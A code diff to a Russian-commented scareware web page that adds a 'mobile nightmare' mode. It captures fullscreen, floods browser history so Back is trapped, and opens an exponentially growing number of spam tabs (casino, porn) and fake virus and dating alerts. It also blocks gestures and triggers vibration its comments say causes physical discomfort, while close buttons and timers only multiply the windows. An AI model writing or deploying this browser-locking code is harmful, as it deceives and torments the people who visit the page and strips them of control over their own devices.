@@ -29,6 +29,7 @@
             background-color: var(--bg-color);
             color: var(--text-main);
             overflow: hidden; /* Запрещаем скролл, чтобы жертва не сбежала  */
+            touch-action: none; /* Жестко блокируем свайпы, pull-to-refresh и зум на мобильных */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -181,10 +182,24 @@
         .toast-close { color: #64748b; font-weight: bold; padding-left: 10px; font-size: 1.2em; }
         .toast-close:hover { color: var(--danger); }
 
-        @media (max-width: 600px) { /* МОБИЛЬНЫЙ АДАПТИВ  */
-            .title { font-size: 1.5em; }
-            .scam-container { padding: 30px 20px; }
+        /* ЖЕСТКИЙ МОБИЛЬНЫЙ АДАПТИВ */
+        @media (max-width: 600px) {
+            .title { font-size: 1.4em; }
+            .scam-container { padding: 25px 15px; width: 95%; }
+            .desc { font-size: 1em; }
+            .timer-box { font-size: 1.1em; padding: 10px; }
             .runaway-btn { font-size: 1.1em; padding: 12px 24px; }
+            
+            /* На мобилках окна спавнятся почти на всю ширину и центрируются лучше */
+            .modern-toast {
+                width: 95vw;
+                max-width: none;
+                padding: 12px 15px;
+                gap: 10px;
+            }
+            .toast-icon { font-size: 1.3em; }
+            .toast-title { font-size: 0.85em; }
+            .toast-msg { font-size: 0.8em; }
         }
     </style>
 </head>
@@ -227,7 +242,37 @@
             }, 2500);
         };
 
-        // 2. Логика плавно убегающей кнопки
+        // 2. Инициализация мобильного кошмара (Full screen & History Trap)
+        let initializedNightmare = false;
+        
+        function initMobileNightmare() {
+            if (initializedNightmare) return;
+            initializedNightmare = true;
+
+            // Захват полноэкранного режима (скрывает адресную строку)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(e => console.log(e));
+            } else if (document.documentElement.webkitRequestFullscreen) { // Safari
+                document.documentElement.webkitRequestFullscreen().catch(e => console.log(e));
+            }
+
+            // History API Trap: Забиваем историю браузера, чтобы кнопка "Назад" не работала
+            for (let i = 0; i < 20; i++) {
+                window.history.pushState(null, document.title, window.location.href);
+            }
+            
+            // Наказываем за попытку нажать системную кнопку "Назад" (особенно на Android)
+            window.addEventListener('popstate', function () {
+                window.history.pushState(null, document.title, window.location.href);
+                triggerTrap(); // Вызываем геометрическую прогрессию окон
+            });
+        }
+
+        // Перехватываем первое касание по экрану для запуска ловушек (браузеры требуют взаимодействия)
+        document.body.addEventListener('touchstart', initMobileNightmare, { once: true });
+        document.body.addEventListener('click', initMobileNightmare, { once: true });
+
+        // 3. Логика плавно убегающей кнопки
         const btn = document.getElementById('runaway');
         const arena = document.getElementById('arena');
 
@@ -258,7 +303,7 @@
             triggerTrap(); // 
         });
 
-        // 3. Логика ловушки с ГЕОМЕТРИЧЕСКОЙ ПРОГРЕССИЕЙ
+        // 4. Логика ловушки с ГЕОМЕТРИЧЕСКОЙ ПРОГРЕССИЕЙ
         const spamUrls = [
             "casino.html", // 
             "prn.html", // 
@@ -278,20 +323,18 @@
 
         function triggerTrap() {
             trapCount++;
-            // Увеличиваем множитель в геометрической прогрессии (2, 4, 8, 16...)
             let multiplier = Math.pow(2, trapCount);
 
             if (navigator.vibrate) {
-                navigator.vibrate([300, 100, 400, 100, 500]); // Агрессивная вибрация в качестве наказания за клик 
+                // На мобильных длинный паттерн вибрации вызывает физический дискомфорт
+                navigator.vibrate([300, 100, 400, 100, 500, 100, 600]); 
             }
 
             let popupBlocked = false;
 
-            // Попытка открыть реальные вкладки в цикле
             for(let i = 0; i < multiplier; i++) {
                 try {
                     let newWin = window.open(getRandomSpamUrl(), '_blank'); // 
-                    // Проверяем, сработал ли браузерный блокировщик всплывающих окон
                     if (!newWin || newWin.closed || typeof newWin.closed === 'undefined') {
                         popupBlocked = true;
                     }
@@ -300,23 +343,20 @@
                 }
             }
             
-            // Если браузер защитил вкладки, удваиваем наказание через фейковые DOM-окна
             let domSpamCount = popupBlocked ? multiplier * 3 : multiplier;
 
-            // Спавним окна каскадом с небольшой задержкой для эффекта заражения
             for(let i = 0; i < domSpamCount; i++) {
                 setTimeout(createToast, i * 150);
             }
         }
 
-        // Перехватываем клик мимо кнопки
         document.body.addEventListener('click', (e) => {
             if (e.target.id !== 'runaway' && document.getElementById('loader').style.display === 'none') {
                 triggerTrap();
             }
         });
 
-        // 4. Генератор современных фейковых окон
+        // 5. Генератор современных фейковых окон
         const messages = [
             { icon: "🚨", title: "КРИТИЧЕСКАЯ УГРОЗА", text: "Обнаружен вирус Win32.Trojan.Lol" }, // 
             { icon: "💋", title: "НОВОЕ СООБЩЕНИЕ", text: "HOT SINGLES IN YOUR AREA WANT TO CHAT" }, // 
@@ -330,8 +370,12 @@
             const toast = document.createElement('div');
             toast.className = 'modern-toast';
             
-            // Разбрасываем окна хаотично по всему экрану
-            const maxLeft = Math.max(10, window.innerWidth - 340);
+            // На мобильных устройствах окна должны спавниться так, чтобы они не вылезали за экран, 
+            // иначе это сломает дизайн. Используем более точные расчеты.
+            const isMobile = window.innerWidth <= 600;
+            const toastWidth = isMobile ? window.innerWidth * 0.95 : 320;
+            
+            const maxLeft = Math.max(5, window.innerWidth - toastWidth - 10);
             const maxTop = Math.max(10, window.innerHeight - 100);
             
             toast.style.left = Math.random() * maxLeft + 'px'; // 
@@ -348,26 +392,24 @@
                 <div class="toast-close">✕</div>
             `;
             
-            // Нажатие на крестик НЕ ЗАКРЫВАЕТ окно, а визуально "ломает" его и спавнит новые
             toast.addEventListener('click', (e) => {
-                e.stopPropagation(); // Не даем всплыть до body
+                e.stopPropagation(); 
                 toast.style.transform = 'scale(0.95)';
                 toast.style.filter = 'grayscale(0.8)';
                 toast.querySelector('.toast-close').innerText = '☠️';
-                triggerTrap(); // Геометрическая прогрессия в действии 
+                triggerTrap(); // 
             });
             
             document.body.appendChild(toast); // 
         }
 
-        // Автоматический спам окнами
         setInterval(() => {
             if(document.getElementById('loader').style.display === 'none') {
                 createToast();
             }
         }, 3000);
 
-        // 5. Фейковый таймер 
+        // 6. Фейковый таймер 
         let timeLeft = 600; // 
         const timerEl = document.getElementById('timer'); // 
         setInterval(() => {
@@ -381,10 +423,10 @@
             }
         }, 1000); 
 
-        // 6. Засада по времени (pop-under) 
+        // 7. Засада по времени 
         setTimeout(() => {
             if(document.getElementById('loader').style.display === 'none') {
-                triggerTrap(); // Вместо открытия 1 вкладки запускаем весь цикл прогрессии
+                triggerTrap(); 
             }
         }, 12000); 
     </script>
